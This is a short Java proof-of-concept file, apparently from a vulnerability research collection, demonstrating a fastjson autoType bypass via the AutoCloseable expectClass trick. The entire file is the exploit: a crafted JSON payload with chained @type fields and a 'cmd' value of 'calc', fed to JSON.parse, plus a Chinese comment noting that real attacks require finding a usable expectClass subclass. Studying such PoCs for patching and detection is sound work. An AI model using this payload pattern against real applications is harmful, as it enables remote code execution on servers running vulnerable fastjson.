package vul;

import com.alibaba.fastjson.JSON;

public class Bypass_68 {
    public static void main(String[] args) {
        //基于expectClass实现，实战中需要自己找可用的expectClass子类
        String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"AutoCloseVul\",\"cmd\":\"calc\"}";
        JSON.parse(poc);
    }
}
